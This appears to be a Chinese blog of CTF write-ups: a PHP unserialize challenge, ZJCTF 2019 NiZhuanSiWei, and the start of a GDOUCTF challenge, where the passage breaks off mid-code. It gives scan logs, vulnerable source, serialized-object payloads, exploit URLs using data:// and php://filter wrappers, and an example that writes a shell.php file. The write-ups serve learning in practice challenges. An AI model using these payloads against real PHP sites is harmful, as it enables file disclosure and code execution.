<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs log">[13:31:24] Starting:<br>[13:31:28] 403 -  309B  - /.ht_wsr.txt<br>[13:31:28] 403 -  312B  - /.htaccess.bak1<br>[13:31:28] 403 -  312B  - /.htaccess.save<br>[13:31:28] 403 -  314B  - /.htaccess.sample<br>[13:31:28] 403 -  310B  - /.htaccess_sc<br>[13:31:28] 403 -  313B  - /.htaccess_extra<br>[13:31:28] 403 -  312B  - /.htaccess.orig<br>[13:31:28] 403 -  310B  - /.htaccessBAK<br>[13:31:28] 403 -  312B  - /.htaccess_orig<br>[13:31:28] 403 -  310B  - /.htaccessOLD<br>[13:31:28] 403 -  311B  - /.htaccessOLD2<br>[13:31:28] 403 -  302B  - /.htm<br>[13:31:28] 403 -  303B  - /.html<br>[13:31:28] 403 -  312B  - /.htpasswd_test<br>[13:31:28] 403 -  309B  - /.httr-oauth<br>[13:31:28] 403 -  308B  - /.htpasswds<br>[13:31:45] 200 -    0B  - /flag.php<br>[13:31:56] 200 -   35B  - /robots.txt<br>[13:31:57] 403 -  311B  - /server-status<br>[13:31:57] 403 -  312B  - /server-status/<br></code></pre></td></tr></table></figure>
<p>直接访问flag.php无果，<br>访问robots.txt  </p>
<h2 id="notice-1"><a href="#notice-1" class="headerlink" title="notice"></a>notice</h2><p>robots大概作用应该是用来告诉搜索引擎不能爬取哪些页面，没有强制性作用</p>
<p>在robots里发现&#x2F;cl45s.php<br>访问得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br></code></pre></td></tr></table></figure>
<p>写了个payload，一次成功</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">wllm</span>();<br><span class="hljs-variable">$a</span>-&gt;admin=<span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;passwd=<span class="hljs-string">&quot;ctf&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">///运行得到:O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
<p>直接get传得到flag</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;<br></code></pre></td></tr></table></figure>

<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>没看懂为啥get传好像传不进去<br>去看大佬的wp</p>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/3017">https://www.nssctf.cn/note/set/3017</a>   </p>
<p>原来是这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>)<br></code></pre></td></tr></table></figure>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><em><strong>file_get_contents()</strong></em></h2><p>file_get_contents() 函数在 PHP 中用于读取文件内容或获取远程资源的内容。<br>它可以读取通过 GET 方法传入的 URL 或文件路径，但不能直接读取通过 GET 方法传入的字符串参数。</p>
<p>所以像这样传入字符串是没用的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?text=welcome to the zjctf<br></code></pre></td></tr></table></figure>
<p>法一：  </p>
<p>通过data:&#x2F;&#x2F;伪协议，让字符串传递进去。这里传递纯文本，payload：text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
<p>法二:<br>通过php:&#x2F;&#x2F;input伪协议构造POST请求，传进去的字符串就放在post请求的payload上</p>
<p>我是选法一了，毕竟直接在url上就能完成<br>data:&#x2F;&#x2F; 协议：<br>data:&#x2F;&#x2F; 协议允许你通过数据 URI 来访问数据。你可以将数据直接嵌入到 URL 中，而不需要创建一个实际的文件。<br>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 打印 &quot;I love PHP&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// text/plain，表示的是文本</span><br><br><span class="hljs-comment">// text/plain;base64, 若纯文本没用可用base64编码</span><br></code></pre></td></tr></table></figure>
<p>这样就能传入welcome to the zjctf了</p>
<p>接下来  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>(); <br></code></pre></td></tr></table></figure>
<blockquote>
<p>检查$file变量中是否包含字符串”flag”。  </p>
</blockquote>
<blockquote>
<p>preg_match(“&#x2F;flag&#x2F;“,$file)：使用正则表达式匹配$file中是否包含”flag”。  </p>
</blockquote>
<blockquote>
<p>如果匹配到”flag”，输出”Not now!”并终止脚本执行。  </p>
</blockquote>
<p>由于并不是过滤字符，没法用双写绕过了</p>
<p>这样先看下面，有提示一个useless.php</p>
<blockquote>
<p>根据反序列化代码我们可以推测题目想让我们构造反序列化POC触发useless.php里面的类，<br>要想构造POC我们得知道这个类长什么样，<br>于是问题的矛盾指向了useless.php的源码，<br>这里只能通过php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php来查看加密后的源码（不加密会被当成php执行）</p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//n</span>ode4.anna.nssctf.cn:<span class="hljs-number">28681</span>/?text=data:<span class="hljs-regexp">//</span>text/plain,welcome<span class="hljs-variable">%2</span>0to<span class="hljs-variable">%2</span>0the<span class="hljs-variable">%20zjctf</span>&amp;file=php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>
<p>得到useless.php得内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>

<p>那么最后就有:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><span class="hljs-variable">$a</span>-&gt;file=flag.php;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>最后poc出了password的payload，  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:7:&quot;flagphp&quot;;&#125;<br></code></pre></td></tr></table></figure>
<p>但是传进去后只回显了个  </p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br><br><br>oh u find <span class="hljs-keyword">it</span><br><br>U R SO CLOSE <span class="hljs-comment">!///COME ON PLZ</span><br></code></pre></td></tr></table></figure>
<p>最后去看别人的wp才知道flag就包含在这个页面下，按f12就能看到了😅<br>最终payload</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome<span class="hljs-meta">%20to</span><span class="hljs-meta">%20the</span><span class="hljs-meta">%20zjctf</span>&amp;file=useless.php&amp;password=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题我就只会最后构造反序列化的poc了<br>但也是学到了php伪协议的东西</p>
<h2 id="notice01"><a href="#notice01" class="headerlink" title="notice01"></a>notice01</h2><h2 id="KIMI-逐部分解析"><a href="#KIMI-逐部分解析" class="headerlink" title="KIMI:逐部分解析"></a>KIMI:逐部分解析</h2><p>include:<br>include 是 PHP 中的一个语句，用于动态包含另一个文件的内容到当前脚本中。<br>如果被包含的文件中包含 PHP 代码，这些代码会被执行。<br>php:&#x2F;&#x2F;filter:<br>php:&#x2F;&#x2F;filter 是一个伪协议，允许开发者在读取或写入数据时应用过滤器。它可以在数据流打开时对数据进行处理。<br>convert.base64-encode:<br>这是一个过滤器，表示对数据进行 Base64 编码。Base64 编码是一种将二进制数据转换为 ASCII 字符串的方法，常用于在需要以文本形式传输二进制数据的场景。<br>resource&#x3D;useless.php:<br>resource 参数指定了要处理的文件路径，这里是 useless.php。这意味着过滤器将应用于 useless.php 文件的内容。</p>
<hr>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter "></a>php:&#x2F;&#x2F;filter </h2><p>是 PHP 中一种独特的伪协议，它允许开发者在数据读取或写入过程中应用过滤器，从而实现对数据的处理。它是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，例如 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>php:&#x2F;&#x2F;filter 协议的一般语法为：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/&lt;action&gt;/resource=&lt;待过滤的数据流&gt;</span><br><br><span class="hljs-comment">//其中 &lt;action&gt; 表示要对数据执行的过滤操作，如读取（read）、转换编码（convert）或字符串操作（string）等；  </span><br><span class="hljs-comment">//&lt;待过滤的数据流&gt; 通常是要读取或写入的文件路径或 URL。</span><br><span class="hljs-comment">//过滤器可以设置多个，按照链式的方式依次对数据进行过滤处理</span><br></code></pre></td></tr></table></figure>
<p>过滤器分类<br>字符串过滤器：以 string 开头，对数据进行字符串处理，如 rot13、toupper、tolower、strip_tags 等。<br>转换过滤器：以 convert 开头，对数据进行编码转换，如 Base64 编码、解码，Quoted-Printable 编码、解码，iconv 字符编码转换等。<br>压缩过滤器：如 zlib.deflate（压缩）、zlib.inflate（解压）、bzip2.compress（压缩）、bzip2.decompress（解压）等。<br>加密过滤器：如 mcrypt.* 和 mdecrypt.*，用于数据的加密和解密。不过，这个特性已自 PHP 7.1.0 起废弃，强烈建议不要使用。</p>
<p>示例<br>读取文件并进行 Base64 编码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>);<br>这行代码会读取 index.php 文件的内容，并将其进行 Base64 编码后输出。<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>));<br>这行代码会将 Base64 编码的字符串写入 shell.php 文件，<br>并在写入前进行 Base64 解码，最终 shell.php 文件中将包含原始的 <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span> 代码。<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-18date-2025-03-26-21-35-34tags-unserialize"><a href="#title-note-18date-2025-03-26-21-35-34tags-unserialize" class="headerlink" title="title: note-18date: 2025-03-26 21:35:34tags: unserialize"></a>title: note-18<br>date: 2025-03-26 21:35:34<br>tags: unserialize</h2><h1 id="GDOUCTF-反方向的钟"><a href="#GDOUCTF-反方向的钟" class="headerlink" title="GDOUCTF_反方向的钟"></a>GDOUCTF_反方向的钟</h1><p>开篇源码，但是看不懂</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span 